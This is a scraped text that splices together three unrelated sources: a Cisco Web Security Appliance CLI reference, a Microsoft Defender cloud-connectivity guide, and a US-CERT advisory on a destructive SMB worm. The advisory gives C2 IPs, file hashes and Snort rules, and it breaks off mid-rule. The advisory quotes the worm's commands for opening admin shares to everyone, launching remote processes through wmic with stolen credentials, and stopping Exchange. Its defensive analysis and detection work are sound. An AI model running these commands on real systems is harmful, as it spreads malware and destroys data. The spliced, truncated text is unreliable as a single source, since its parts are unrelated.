                                  Defines a minimum request body size, below which upload requests are not scanned by the Cisco Data Security Filters.  Displays the current date. Example:  Proxy- and reporting-related subcommands: NET – Network Diagnostic Utility 
                            This command has been deprecated; use packetcapture to capture network traffic on the appliance. PROXY – Proxy Debugging Utility 
                            Choose the operation you want to perform: REPORTING – Reporting Utilities 
                            The reporting system is currently enabled.  Choose the operation you want to perform:  Configure DNS server parameters.  Flush DNS entries on the appliance.  Configure Ethernet port connections.  Defines a minimum request body size, below which upload requests are not scanned by the external DLP server.  Defines a minimum request body size, below which upload requests are not scanned by the external DLP server.  Submits valid keys to activate licensed features.  Automatically check for and update feature keys. SETUP – Enable/disable FIPS 140-2 compliance, and encryption of Critical Sensitive Parameters (CSP). Note that an immediate reboot
                              will be necessary. 
                           FIPSCHECK – Check FIPS mode compliance. Indicates whether various certificates and services are FIPS compliant. 
                           See FIPS Compliance for additional information. 
                            Searches named input files for lines containing a match to the given pattern.  Returns a list of commands.  Clears the message in the web interface and CLI that indicates when this Web Security appliance is managed by a Security
                              Management appliance (M-Series). 
                            Configure and manage network interfaces including M1, P1, and P2. Displays currently configured interfaces, and provides
                              an operations menu to create, edit, or delete interfaces. 
                            Displays current ISE configuration parameters; specify an ISE configuration operation to perform:  Specify an ISE data-related operation: 
statistics – Show ISE server status and ISE statistics. 
                           
cache – Show the ISE cache, or check an IP address: 
                           
show – Show the ISE ID cache. 
                           
checkip – Query the local ISE cache for an IP address. 
                           
sgts – Show the ISE Secure Group Tag (SGT) table. 
                            Displays current ISE configuration parameters; specify an ISE configuration operation to perform:  Specify an ISE data-related operation: 
statistics – Show ISE server status and ISE statistics. 
                           
cache – Show the ISE cache, or check an IP address: 
                           
show – Show the ISE ID cache. 
                           
checkip – Query the local ISE cache for an IP address. 
                           
sgts – Show the ISE Secure Group Tag (SGT) table. 
                            Lists user-specific user information that includes ttys and hosts, in reverse time order or lists the users that are logged
                              in at a specified date and time. 
                            Load a system configuration file.  Configure access to log files.  Mail the current configuration file to the address specified.  Set the maximum HTTP header size or URL size for proxy requests; enter the value in bytes, or append a K to the number to
                              indicate kilobytes. 
                            Policy Trace can fail for a user that belongs to a large number of authentication groups. It can also fail if the HTTP response
                              header size or URL size is greater than the current “max header size.” Increasing this value can alleviate such failures.
                              Minimum value is 32 KB; default value is 32 KB; maximum value is 1024 KB. 
                            Use this command to enable Secure Mobility and configure how to identify remote users, either by IP address or by integrating
                              with one or more Cisco adaptive security appliances. 
                            Use this command to display information related to Secure Mobility when the Web Security appliance is integrated with an
                              adaptive security appliance. 
                            This command displays the following information:  The WSA utilizes several buffers and optimization algorithms to handle hundreds of TCP connections simultaneously, providing
                              high performance for typical Web traffic—that is, short-lived HTTP connections. 
                            In certain situations, such as frequent downloading of large files (100+ MB), larger buffers can provide better per-connection
                              performance. However, overall memory usage will increase, and thus any buffer increases should be in line with the memory
                              available on the system. 
                            The send- and receive-space variables represent the buffers used for storing data for communications over any given TCP socket.
                              The send- and receive-auto variables are used to enable and disable the FreeBSD auto-tuning algorithm for dynamically controlling
                              window size. These two parameters are applied directly in the FreeBSD kernel. 
                           When SEND_AUTO and RECV_AUTO are enabled, the system tunes the window size dynamically based on system load and available resources. On a lightly loaded
                              WSA, the system attempts to keep window sizes large to reduce per transaction latency. The maximum value of the dynamically
                              tuned window size is dependent on the configured number of mbuf clusters, which in turn is dependent on the total RAM available
                              on the system. As the total number of client connections increases, or when the available network buffer resources become
                              scarce, the system tunes down the window sizes to protect itself from losing all network buffer resources to proxied traffic.
                              
                            See Upload/Download Speed Issues for additional information about using this command. 
                            The networktuning subcommands are: 
                           SENDSPACE – TCP send-space buffer size; range is from 8192 to 131072 bytes; the default is 16000 bytes. 
                           RECVSPACE – TCP receive-space buffer size; range is from 8192 to 131072 bytes; the default is 32768 bytes. 
                           SEND-AUTO – Enable/disable TCP send auto-tuning; 1 = On, 0 = Off; default is Off. If you enable TCP send auto-tuning, be sure to use
                              advancedproxyconfig > miscellaneous > Would you like proxy to perform dynamic adjustment of TCP send window size? to disable send buffer auto-tuning. 
                           RECV-AUTO – Enable/disable TCP receive auto-tuning; 1 = On, 0 = Off; default is Off. If you enable TCP receive auto-tuning, be sure
                              to use advancedproxyconfig > miscellaneous > Would you like proxy to perform dynamic adjustment of TCP receive window size? to disable receive buffer auto-tuning. 
                           MBUF CLUSTER COUNT – Change the number of available mbuf clusters; acceptable range is from 98304 to 1572864. The value should vary according
                              to installed system memory, using this calculation: 98304 * (X/Y) where is X is gigabytes of RAM on the system and Y is 4
                              GB. For example, with 4 GB RAM, the recommended value is 98304 * (4/4) = 98304. Linear scaling is recommended as RAM increases.
                              
                           SENDBUF-MAX – Specify the maximum send buffer size; range is from 131072 bytes to 2097152 bytes; the default is 1 MB (1048576 bytes).
                              
                           RECVBUF-MAX – Specify the maximum receive buffer size; range is from 131072 bytes to 2097152 bytes; the default is 1 MB (1048576 bytes).
                              
                           CLEAN-FIB-1 – Remove all M1/M2 entries from the data-routing table—essentially, enable control-plane/data-plane separation. That is,
                              disable any data-plane process from sending data over the M1 interface when “Separate Routing” is enabled. Data-plane processes
                              are those for which “Use data routing table” is enabled, or which carry strictly non-management traffic. Control-plane processes
                              can still send data of over either the M1 or P1 interfaces. 
                            Following any changes to these parameters, be sure to commit your changes and the restart the appliance.  Use this command only if you understand the ramifications. We recommend using only with TAC guidance.  Queries Internet domain name servers for information about specified hosts and domains or to print a list of hosts in a domain.
                              
                            Configure NTP servers. Displays currently configured interfaces, and provides an operations menu to add, remove, or set the
                              interface from whose IP address NTP queries should originate. 
                            Intercepts and displays TCP/IP and other packets being transmitted or received over the network to which the appliance is
                              attached. 
                            Set the passphrase.  Enables or disables Path MTU Discovery.  You might want to disable Path MTU Discovery if you need to packet fragmentation.  Sends an ICMP ECHO REQUEST to the specified host or gateway.  Enables or disables the Web Proxy.  Display web proxy statistics.  Terminates an active process or session.  Flushes the file system cache to disk, halts all running processes, and restarts the system.  Configure a reporting system.  Restores the configuration to factory defaults.  Revert the AsyncOS for Web operating system to a previous qualified build. This is a very destructive action, destroying
                              all configuration logs and databases. Refer to Reverting to a Previous Version of AsyncOS for Web for information about using this command. 
                            Roll over a log file.  Configure destination IP addresses and gateways for traffic. Displays currently configured routes, and provides an operations
                              menu to create, edit, or delete, or clear entries. 
                            Saves a copy of the current configuration settings to a file. This file can be used to restore defaults, if necessary. If FIPS mode is enable, provide a passphrase-handling option: Mask passphrases or Encrypt passphrases. 
                            Configure the default gateway for the machine.  Set the hostname parameter.  Changes the security setting for the NTLM authentication realm to either “ads” or “domain”.  Default is ads . 
                            Set system time.  Displays the current time zone and the time zone version. Provides an operations menu to set a local time zone.  Display all configuration values.  Terminates connections and shuts down the system.  Configure SMTP relay hosts for internally generated email. An SMTP relay host is required to receive system generated email
                              and alerts. 
                            Configure the local host to listen for SNMP queries and allow SNMP requests.  Configure hostname and host key options for trusted servers.  The default cipher for AsyncOS versions 9.0 and earlier is DEFAULT:+kEDH. For AsyncOS versions 9.1 and later, it the default cipher is 
                            In both cases, this may change based on your ECDHE cipher selections. However, regardless of version, the default cipher does not change when you upgrade to a newer AsyncOS version. For example,
                                             when you upgrade from an earlier version to AsyncOS 9.1, the default cipher is DEFAULT:+kEDH. In other words, following an upgrade, you must update the current cipher suite yourself; Cisco recommends updating to 
                                          
FALLBACK – Enable/disable the SSL/TLS fall-back option. If enabled, communications with remote servers will fall back to the lowest
                              configured protocol following a handshake failure. 
                            After a protocol version is negotiated between client and server, handshake failure is possible because of implementation
                              issues. If this option is enabled, the proxy attempts to connect using the lowest version of the currently configured TLS/SSL
                              protocols. 
                           
ECDHE – Enable/disable use of ECDHE ciphers for LDAP. 
                            Additional ECDH ciphers are supported in successive releases; however, certain named curves provided with some of the additional
                              ciphers cause the appliance to close a connection during secure LDAP authentication and HTTPS traffic decryption. See SSL Configurationfor more information about specifying additional ciphers. 
                            If you experience these issues, use this option to disable or enable ECDHE cipher use for either or both features.  Displays system status. Send the support request email to Cisco Customer Support. This includes system information and a copy of the master configuration.
                              
                           (Optional) If you provide the service request number, a larger set of system and configuration information is added to the
                              service request automatically. This information is zipped and uploaded to the service request using FTP. 
                            Displays the end of a log file. Command accepts log file name as parameter. Example 1Example 2 Displays information about open TCP/IP services.  Provides a temporary connection to allow Cisco Customer Support to access the system and assist in troubleshooting. Communicates with another host using the TELNET protocol, usually used to check connectivity.  Tests the authentication settings for a given authentication realm against the authentication servers defined in the realm.
                              
                            Running the command without any option causes the appliance to list the configured authentication realms from which you can
                              make a selection. 
                            The debug flag ( -d ) controls the level of debug information. The levels can range between 0-10. If unspecified, the appliance uses a level of
                              0. With level 0, the command will return success or failure. If the test settings fail, the command will list the cause of
                              the failure. 
                            These two commands are documented in Using the CLI to Configure Advanced Transparent User Identification Settings. 
                            Traces IP packets through gateways and along the path to a destination host.  Configure update and upgrade settings.  Update all components. Install the Async OS software upgrade. downloadinstall – Download and immediately install an upgrade package. 
                           download – Download and save upgrade package for installation later. 
                           After you enter either of these commands, a list of upgrade packages applicable for this WSA is displayed. Select the desired
                              package by entering its entry number and then pressing Enter; download begins in the background. During download, additional
                              subcommands are available: downloadstatus and canceldownload. 
                           When download is complete, if you initially entered downloadinstall, installation begins immediately. If you entered download, two additional commands are available when download is complete: install and delete. Enter install to begin installing a previously downloaded package. Use delete to remove the previously downloaded package from the WSA. 
                            Configure system administrators.  Displays general system information, installed versions of system software, and rule definitions. all - Displays details of all WCCP (Web Cache Communication Protocol) service groups.
                           servicegroup - Displays details of a specific WCCP service group.
                            Examine or modify the contents of the proxy cache, or configure domains and URLs that the appliance never caches. Allows
                              an administrator to remove a particular URL from the proxy cache or specify which domains or URLs to never store in the proxy
                              cache. 
                            Displays users logged into the system, for both CLI and Web interface sessions.  Displays user information. 




Applies to:To ensure Windows Defender Antivirus cloud-delivered protection works properly, you need to configure your network to allow connections between your endpoints and certain Microsoft servers.This topic lists the connections that must be allowed, such as by using firewall rules, and provides instructions for validating your connection. This will help ensure you receive the best protection from our cloud-delivered protection services.See the Enterprise Mobility and Security blog post Important changes to Microsoft Active Protection Services endpoint for some details about network connectivity.TipYou can also visit the Windows Defender ATP demo website at demo.wd.microsoft.com to confirm the following features are working:The Windows Defender Antivirus cloud service provides fast, strong protection for your endpoints. Enabling the cloud-delivered protection service is optional, however it is highly recommended because it provides very important protection against malware on your endpoints and across your network.NoteThe Windows Defender Antivirus cloud service is a mechanism for delivering updated protection to your network and endpoints. Although it is called a cloud service, it is not simply protection for files stored in the cloud, rather it uses distributed resources and machine learning to deliver protection to your endpoints at a rate that is far faster than traditional signature updates.See Enable cloud-delivered protection for details on enabling the service with Intune, System Center Configuration Manager, Group Policy, PowerShell cmdlets, or on individual clients in the Windows Security app.After you've enabled the service, you may need to configure your network or firewall to allow connections between it and your endpoints.The following table lists the services and their associated URLs that your network must be able to connect to. You should ensure there are no firewall or network filtering rules that would deny access to these URLs, or you may need to create an allow rule specifically for them:After whitelisting the URLs listed above, you can test if you are connected to the Windows Defender Antivirus cloud service and are correctly reporting and receiving information to ensure you are fully protected.Use the cmdline tool to validate cloud-delivered protection:Use the following argument with the Windows Defender Antivirus command line utility (mpcmdrun.exe) to verify that your network can communicate with the Windows Defender Antivirus cloud service:NoteYou need to open an administrator-level version of the command prompt. Right-click the item in the Start menu, click Run as administrator and click Yes at the permissions prompt. This command will only work on Windows 10, version 1703 or higher.See Manage Windows Defender Antivirus with the mpcmdrun.exe commandline tool for more information on how to use the mpcmdrun.exe utility.Attempt to download a fake malware file from Microsoft:You can download a sample file that Windows Defender Antivirus will detect and block if you are properly connected to the cloud.Download the file by visiting the following link:NoteThis file is not an actual piece of malware. It is a fake file that is designed to test if you are properly connected to the cloud.If you are properly connected, you will see a warning Windows Defender Antivirus notification:If you are using Microsoft Edge, you'll also see a notification message:A similar message occurs if you are using Internet Explorer:You will also see a detection under Quarantined threats in the Scan history section in the Windows Security app:Open the Windows Security app by clicking the shield icon in the task bar or searching the start menu for Defender.Click the Virus & threat protection tile (or the shield icon on the left menu bar) and then the Scan history label: Under the Quarantined threats section, click the See full history label to see the detected fake malware: NoteVersions of Windows 10 before version 1703 have a different user interface. See Windows Defender Antivirus in the Windows Security app for more information about the differences between versions, and instructions on how to perform common tasks in the different interfaces.The Windows event log will also show Windows Defender client event ID 2050.ImportantYou will not be able to use a proxy auto-config (.pac) file to test network connections to these URLs. You will need to verify your proxy servers and any network filtering tools manually to ensure connectivity.
We'd love to hear your thoughts. Choose the type you'd like to provide:		Our new feedback system is built on GitHub Issues. Read about this change in our blog post.Loading feedback...
Microsoft WindowsUS-CERT was recently notified by a trusted third party of cyber threat actors using a Server Message Block (SMB) Worm Tool to conduct cyber exploitation activities recently targeting a major entertainment company. This SMB Worm Tool is equipped with a Listening Implant, Lightweight Backdoor, Proxy Tool, Destructive Hard Drive Tool, and Destructive Target Cleaning Tool.SMB Worm Tool: This worm uses a brute force authentication attack to propagate via Windows SMB shares. It connects home every five minutes to send log data back to command and control (C2) infrastructure if it has successfully spread to other Windows hosts via SMB port 445. The tool also accepts new scan tasking when it connects to C2. There are two main threads: the first thread calls home and sends back logs (a list of successful SMB exploitations), and the second thread attempts to guess passwords for SMB connections. If the password is correctly guessed, a file share is established and file is copied and run on the newly-infected host.Listening Implant: During installation of this tool, a portion of the binaries is decrypted using AES, with a key derived from the phrase "National Football League." Additionally, this implant listens for connections on TCP port 195 (for "sensvc.exe" and "msensvc.exe") and TCP port 444 (for "netcfg.dll"). Each message sent to and from this implant is preceded with its length, then XOR encoded with the byte 0x1F. Upon initial connection, the victim sends the string, "HTTP/1.1 GET /dns?\x00." The controller then responds with the string "200 www.yahoo.com!\x00" (for "sensvc.exe" and "msensvc.exe") or with the string "RESPONSE 200 OK!!" (for "netcfg.dll"). The controller sends the byte "!" (0x21) to end the network connection. This special message is not preceded with a length or XOR encoded.Lightweight Backdoor: This is a backdoor listener that is designed as a service DLL. It includes functionality such as file transfer, system survey, process manipulation, file time matching and proxy capability. The listener can also perform arbitrary code execution and execute commands on the command line. This tool includes functionality to open ports in a victim host's firewall and take advantage of universal Plug and Play (UPNP) mechanisms to discover routers and gateway devices, and add port mappings, allowing inbound connections to victim hosts on Network Address Translated (NAT) private networks. There are no callback domains associated with this malware since connections are inbound only on a specified port number.Proxy Tool: Implants in this malware family are typically loaded via a dropper installed as a service, then configured to listen on TCP port 443. The implant may have an associated configuration file which can contain a configurable port. This proxy tool has basic backdoor functionality, including the ability to fingerprint the victim machine, run remote commands, perform directory listings, perform process listings, and transfer files.Destructive Hard Drive Tool: This tool is a tailored hard-drive wiping tool that is intended to destroy data past the point of recovery and to complicate the victim machine’s recovery. If the CNE operator has administrator-level privileges on the host, the program will over-write portions of up-to the first four physical drives attached, and over-write the master boot record (MBR) with a program designed to cause further damage if the hard drive is re-booted. This further results in the victim machine being non-operational with irrecoverable data (There is a caveat for machines installed with the windows 7 operating system: windows 7 machines will continue to operate in a degraded state with the targeted files destroyed until after reboot, in which the infected MBR then wipes the drive.) If the actor has user-level access, the result includes specific files being deleted and practically irrecoverable, but the victim machine would remain usable.Destructive Target Cleaning Tool: This tool renders victim machines inoperable by overwriting the Master Boot Record. The tool is dropped and installed by another executable and consists of three parts: an executable and a dll which contain the destructive components, and an encoded command file that contains the actual destruction commands to be executed.Network Propagation Wiper: The malware has the ability to propagate throughout the target network via built-in Windows shares. Based on the username/password provided in the configuration file and the hostname/IP address of target systems, the malware will access remote network shares in order to upload a copy of the wiper and begin the wiping process on these remote systems. The malware uses several methods to access shares on the remote systems to begin wiping files. Checking for existing shares via “\\hostname\admin$\system32” and “\\hostname\shared$\system32” or create a new share “cmd.exe /q /c net share shared$=%SystemRoot% /GRANT:everyone, FULL”. Once successful, the malware uploads a copy of the wiper file “taskhostXX.exe”, changes the file-time to match that of the built-in file “calc.exe”, and starts the remote process. The remote process is started via the command “cmd.exe /c wmic.exe /node:hostname /user:username /password:pass PROCESS CALL CREATE”. Hostname, username, and password are then obtained from the configuration file. Afterwards, the remote network share is removed via “cmd.exe /q /c net share shared$ /delete”. Once the wiper has been uploaded, the malware reports its status back to one of the four C2 IP addresses.Technical and strategic mitigation recommendations are included in the Solution section below.US-CERT recommends reviewing the Security Tip Handling Destructive Malware #ST13-003.Cyber threat actors are using an SMB worm to conduct cyber exploitation activities.  This tool contains five components – a listening implant, lightweight backdoor, proxy tool, destructive hard drive tool, and destructive target cleaning tool.The SMB worm propagates throughout an infected network via brute-force authentication attacks, and connects to a C2 infrastructure.Due to the highly destructive functionality of this malware, an organization infected could experience operational impacts including loss of intellectual property and disruption of critical systems.Users and administrators are recommended to take the following preventive measures to protect their computer networks:The following is a list of the Indicators of Compromise (IOCs) that can be added to network security solutions to determine whether they are present on a network.Import Hashes:SMB worm tool:Import hash: f6f48551d7723d87daeef2e840ae008fCharacterization: File Hash WatchlistNotes: "SMB worm tool"        Earliest PE compile Time: 20141001T072107Z        Most Recent PE compile Time: 20141001T072107Z Import hash: 194ae075bf53aa4c83e175d4fa1b9d89Characterization: File Hash WatchlistNotes: "SMB worm tool"         Earliest PE compile Time: 20141001T120954Z         Most Recent PE compile Time: 20141001T142138Z Lightweight backdoor:Import hash: f57e6156907dc0f6f4c9e2c5a792df48Characterization: File Hash WatchlistNotes: "Lightweight backdoor"         Earliest PE compile time: 20110411T225224Z         Latest PE compile time: 20110411T225224Z Import hash: 838e57492f632da79dcd5aa47b23f8a9Characterization: File Hash WatchlistNotes: "Lightweight backdoor"         Earliest PE compile time: 20110517T050015Z         Latest PE compile time: 20110605T204508Z Import hash: 11c9374cea03c3b2ca190b9a0fd2816bCharacterization: File Hash WatchlistNotes: "Lightweight backdoor"         Earliest PE compile time: 20110729T062417Z         Latest PE compile time: 20110729T062958Z Import hash: 7fb0441a08690d4530d2275d4d7eb351Characterization: File Hash WatchlistNotes: "Lightweight backdoor"         Earliest PE compile time: 20120128T071327Z         Latest PE compile time: 20120128T071327Z Import hash: 7759c7d2c6d49c8b0591a3a7270a44daCharacterization: File Hash WatchlistNotes: "Lightweight backdoor"         Earliest PE compile time: 20120309T105837Z         Latest PE compile time: 20120309T105837Z Import hash: 7e48d5ba6e6314c46550ad226f2b3c67Characterization: File Hash WatchlistNotes: "Lightweight backdoor"         Earliest PE compile time: 20120311T090329Z         Latest PE compile time: 20120311T090329Z Import hash: 0a87c6f29f34a09acecce7f516cc7fdbCharacterization: File Hash WatchlistNotes: "Lightweight backdoor"         Earliest PE compile time: 20120325T053138Z         Latest PE compile time: 20130513T090422Z Import hash: 25fb1e131f282fa25a4b0dec6007a0ceCharacterization: File Hash WatchlistNotes: "Lightweight backdoor"         Earliest PE compile time: 20130802T054822Z         Latest PE compile time: 20130802T054822Z Import hash: 9761dd113e7e6673b94ab4b3ad552086Characterization: File Hash WatchlistNotes: "Lightweight backdoor"         Earliest PE compile time: 20130913T013016Z         Latest PE compile time: 20130913T013016Z Import hash: c905a30badb458655009799b1274205cCharacterization: File Hash WatchlistNotes: "Lightweight backdoor"         Earliest PE compile time: 20140205T090906Z         Latest PE compile time: 20140205T090906Z Import hash: 40adcd738c5bdc5e1cc3ab9a48b3df39Characterization: File Hash WatchlistNotes: "Lightweight backdoor"         Earliest PE compile time: 20140320T152637Z         Latest PE compile time: 20140402T023748Z Import hash: 68a26b8eaf2011f16a58e4554ea576a1Characterization: File Hash WatchlistNotes: "Lightweight backdoor"         Earliest PE compile time: 20140321T014949Z         Latest PE compile time: 20140321T014949Z Import hash: 74982cd1f3be3d0acfb0e6df22dbcd67Characterization: File Hash WatchlistNotes: "Lightweight backdoor"         Earliest PE compile time: 20140506T020330Z         Latest PE compile time: 20140506T020330Z Proxy tool:Import hash: 734740b16053ccc555686814a93dfbebCharacterization: File Hash WatchlistNotes: "Proxy tool"         Earliest PE compile time: 20140611T064905Z         Latest PE compile time: 20140611T064905Z Import hash: 3b9da603992d8001c1322474aac25f87Characterization: File Hash WatchlistNotes: "Proxy tool"         Earliest PE compile time: 20140617T035143Z         Latest PE compile time: 20140617T035143Z Import hash: e509881b34a86a4e2b24449cf386af6aCharacterization: File Hash WatchlistNotes: "Proxy tool"         Earliest PE compile time : 20140618T064527Z         Latest PE compile time: 20140618T064527Z Import hash: 9ab7f2bf638c9d911c2c742a574db89eCharacterization: File Hash WatchlistNotes: "Proxy tool"         Earliest PE compile time: 20140724T011233Z         Latest PE compile time: 20140724T011233Z Import hash: a565e8c853b8325ad98f1fac9c40fb88Characterization: File Hash WatchlistNotes: "Proxy tool"         Earliest PE compile time: 20140724T065031Z         Latest PE compile time: 20140902T135050Z Import hash: 0bb82def661dd013a1866f779b455cf3Characterization: File Hash WatchlistNotes: "Proxy tool"         Earliest PE compile time: 20140819T024812Z         Latest PE compile time: 20140819T024812Z Import hash: b8ffff8b57586d24e1e65cd0b0ad9173Characterization: File Hash WatchlistNotes: "Proxy tool"         Earliest PE compile time: 20140902T172442Z         Latest PE compile time: 20140902T172442Z Import hash: 4ef0ad7ad4fe3ef4fb3db02cd82bfaceCharacterization: File Hash WatchlistNotes: "Proxy tool"         Earliest PE compile time: 20141024T134136Z         Latest PE compile time: 20141024T134136Z Import hash: eb435e86604abced7c4a2b11c4637a52Characterization: File Hash WatchlistNotes: "Proxy tool"         Earliest PE compile time: 20140526T010925Z         Latest PE compile time: 20140526T010925Z Import hash: ed7a9c6d9fc664afe2de2dd165a9338cCharacterization: File Hash WatchlistNotes: "Proxy tool"         Earliest PE compile time: 20140611T064904Z Destructive hard drive tool:Import hash: 8dec36d7f5e6cbd5e06775771351c54eCharacterization: File Hash WatchlistNotes: "Destructive hard drive tool"         Earliest PE compile time: 20120507T151820Z         Latest PE compile time: 20120507T151820Z Import hash: a385900a36cad1c6a2022f31e8aca9f7Characterization: File Hash WatchlistNotes: "Destructive target cleaning tool"         Earliest PE compile time: 20130318T003315Z         Latest PE compile time: 20130318T003315Z Import hash: 7bea4323807f7e8cf53776e24cbd71f1Characterization: File Hash WatchlistNotes: "Destructive target cleaning tool"         Earliest PE compile time: 20130318T003319Z         Latest PE compile time: 20130318T003319Z Name: d1c27ee7ce18675974edf42d4eea25c6.binSize: 268579 bytes (268.6 KB)MD5: D1C27EE7CE18675974EDF42D4EEA25C6PE Compile Time: 2014-11-22 00:06:54 The malware has the following characteristics:While the original filename of this file is unknown, it was likely “diskpartmg16.exe”. This file serves as a dropper. It drops destructive malware: “igfxtrayex.exe”. When the dropper file was executed, it started a second instance of itself with “-i” as an argument, and then terminated. The second instance of the dropper file installed itself as the “WinsSchMgmt” service with “-k” as a command line argument, started the service, and then terminated. The “WinsSchMgmt” service executed the file with “-k” as an argument, which started another instance of the file using “-s” as an argument. The “-s” instance dropped and executed “igfxtrayex.exe”, created “net_ver.dat”, and began generating network traffic over TCP ports 445 and 139 to victim IP addresses. Name: net_ver.datSize: 4572 bytes (4.6 KB)  (size will vary)MD5: 93BC819011B2B3DA8487F964F29EB934  (hash will vary) This is a log file created by the dropper, and appended to as the scans progress  It contains what appear to be hostnames, IP addresses, and the number 2.   Entries in the file have the structure “HOSTNAME | IP Address | 2”. Name: igfxtrayex.exeSize: 249856 bytes (249.9 KB)MD5: 760C35A80D758F032D02CF4DB12D3E55PE Compile Time: 2014-11-24 04:11:08 This file is destructive malware: a disk wiper with network beacon capabilities. If “igfxtrayex.exe” is run with no parameters, it creates and starts a copy of itself with the “–i” argument. After 10 minutes, the “igfxtrayex.exe” makes three copies of itself and places them in the same directory from which it was executed. These copies are named according to the format “taskhostXX.exe” (where X is a randomly generated ASCII character). These copies are then executed, each with a different argument (one being “-m”, one being “-d” and the other “-w”). Network connection attempts are made to one of three hard-coded IP addresses in a random order to port 8080 or 8000. If a connection to the IP address cannot be made, it attempts to connect to another of the three IP addresses, until connections to all three IP addresses have been attempted. The following command-line string is then executed: “cmd.exe /c net stop MSExchangeIS /y”. A 120-minute (2 hour) sleep command is issued after which the computer is shut down and rebooted. Name: iissvr.exeSize: 114688 bytes (114.7 KB)MD5: E1864A55D5CCB76AF4BF7A0AE16279BAPE Compile Time: 2014-11-13 02:05:35 This file, when executed, starts a listener on localhost port 80. It has 3 files contained in the resource section; all xor’d with 0x63. Name: usbdrv3_32bit.sysSize: 24280 bytes (24.3 KB)MD5: 6AEAC618E29980B69721158044C2E544PE Compile Time: 2009-08-21 06:05:32 This SYS file is a commercially available tool that allows read/write access to files and raw disk sectors for user mode applications in Windows 2000, XP, 2003, Vista, 2008 (32-bit). It is dropped from resource ID 0x81 of “igfxtrayex.exe”. Name: usbdrv3_64bit.sysSize: 28120 bytes (28.1 KB)MD5: 86E212B7FC20FC406C692400294073FFPE Compile Time: 2009-08-21 06:05:35 This SYS file is a also a commercially available tool that allows read/write access to files and raw disk sectors for user mode applications in Windows 2000, XP, 2003, Vista, 2008 (64-bit). It is dropped from resource ID 0x83 of “igfxtrayex.exe”. Name: igfxtpers.exeSize: 91888 bytes (91.9 KB)MD5: e904bf93403c0fb08b9683a9e858c73ePE Compile Time: 2014-07-07 08:01:09 A summary of the C2 IP addresses:IP AddressCountryPortFilename203.131.222.102Thailand8080Diskpartmg16.exeigfxtrayex.exeigfxtpers.exe217.96.33.164Poland8000Diskpartmg16.exeigfxtrayex.exe88.53.215.64Italy8000Diskpartmg16.exeigfxtrayex.exe200.87.126.116Bolivia8000--58.185.154.99Singapore8080--212.31.102.100Cypress8080--208.105.226.235United States--igfxtpers.exe Snort signatures:SMB Worm Tool (not necessarily the tool itself):alert tcp any any -> any any (msg:"Wiper 1"; sid:42000001; rev:1; flow:established; content:"|be 64 ba f2 a8 64|"; depth:6; offset:16; classtype:bad-unknown;)alert tcp any any -> any any (msg:"Wiper 2"; sid:42000002; rev:1; flow:established; content:"|c9 06 d9 96 fc 37 23 5a fe f9 40 ba 4c 94 14 98|"; depth:16; classtype:bad-unknown;)alert tcp any any -> any any (msg:"Wiper 3"; sid:42000003; rev:1; flow:established; content:"|aa 64 ba f2 56|"; depth:50; classtype:bad-unknown;)alert ip any any -> any any (msg:"Wiper 4"; sid:42000004; rev:1; content:"|aa 74 ba f2 b9 75|"; depth:74; classtype:bad-unknown;)alert tcp any any -> any [8000,8080] (msg:"Wiper 5"; sid:42000005; rev:1; flow:established,to_server; dsize:42; byte_test:2,=,40,0,little; content:"|04 00 00 00|"; depth:4; offset:38; classtype:bad-unknown;) Listening Implant:alert tcp any any -> any any (msg:"Listening Implant 1"; sid:42000006; rev:1; flow:established; content:"|0c 1f 1f 1f 4d 5a 4c 4f 50 51 4c 5a 3f 2d 2f 2f 3f 50 54 3e 3e 3e|"; depth:22; classtype:bad-unknown;)alert tcp any any -> any any (msg:"Listening Implant 2"; sid:42000007; rev:1; flow:established; content:"|d3 c4 d2 d1 ce cf d2 c4 a1 b3 b1 b1 a1 ce ca a0 a0 a0|"; depth:18; classtype:bad-unknown;)alert ip any any -> any any (msg:"Listening Implant 3"; sid:42000008; rev:1; content:"|17 08 14 13 67 0f 13 13 17 67 15 02 16 12 02 14 13 78 47 47|"; depth:24; classtype:bad-unknown;)alert ip any any -> any any (msg:"Listening Implant 4"; sid:42000009; rev:1; content:"|4f 50 4c 4b 3f 57 4b 4b 4f 3f 4d 5a 4e 4a 5a 4c 4b 20 1f|"; depth:23; classtype:bad-unknown;)alert ip any any -> any any (msg:"Listening Implant 5"; sid:42000010; rev:1; content:"|15 02 14 17 08 09 14 02 67 75 77 77 67 08 0c 66 66 66|"; depth:22; classtype:bad-unknown;)alert tcp any any -> any any (msg:"Listening Implant 6"; sid:42000011; rev:1; flow:established; content:"|09 22 33 30 28 35 2c|"; fast_pattern:only; classtype:bad-unknown;)alert tcp any any -> any any (msg:"Listening Implant 7"; sid:42000012; rev:1; flow:established; content:"|13 2f 22 35 22 67 26 35 22 29 27 33 67 28 37 22 29 67 37 28 35 33 34 69|"; fast_pattern:only; classtype:bad-unknown;)alert tcp any any -> any any (msg:"Listening Implant 8"; sid:42000013; rev:1; flow:established; content:"|43 47 47 47 45 67 47 47 43 47 47 47 44 67 47 47|"; classtype:bad-unknown;)alert tcp any any -> any any (msg:"Listening Implant 9"; sid:42000014; rev:1; flow:established; content:"|43 47 47 47 42 67 47 47 43 47 47 47 4f 67 47 47 43 47 47 47 43 67 47 47 43 47 47 47 4e 67 47 47|"; classtype:bad-unknown;)alert tcp any any -> any any (msg:"Listening Implant 10"; sid:42000015; rev:1; flow:established; content:"|d1 ce d2 d5 a1 c9 d5 d5 d1 a1 d3 c4 d0 d4 c4 d2 d5 be|"; depth:18; classtype:bad-unknown;)alert tcp any any -> any any (msg:"Listening Implant 11"; sid:42000016; rev:1; flow:established; content:"|17 08 14 13 67 0f 13 13 17 67 15 02 16 12 02 14 13 78|"; depth:18; classtype:bad-unknown;)alert tcp any any -> any any (msg:"Listening Implant 12"; sid:42000017; rev:1; flow:established; content:"|0c 1f 1f 1f 4f 50 4c 4b 3f 57 4b 4b 4f 3f 4d 5a 4e 4a 5a 4c 4b 20|"; classtype:bad-unknown;) Lightweight Backdoor:alert tcp any 488 -> any any (msg:"Lightweight Backdoor 1"; sid:42000018; rev:1; flow:established,from_server; content:"|60 db 37 37 37 37 37 37|"; fast_pattern:only; classtype:bad-unknown;)alert tcp any any -> any 488 (msg:"Lightweight Backdoor 2"; sid:42000019; rev:1; flow:established,to_server; content:"|60 db 37 37 37 37 37 37|"; fast_pattern:only; classtype:bad-unknown;)alert tcp any any -> any any (msg:"Lightweight Backdoor 3"; sid:42000020; rev:1; flow:established; content:"|4c 4c|"; depth:2; offset:16; content:"|75 14 2a 2a|"; distance:4; within:4; classtype:bad-unknown;)alert tcp any any -> any any (msg:"Lightweight Backdoor 4"; sid:42000021; rev:1; flow:established; content:"|8a 10 80 c2 67 80 f2 24 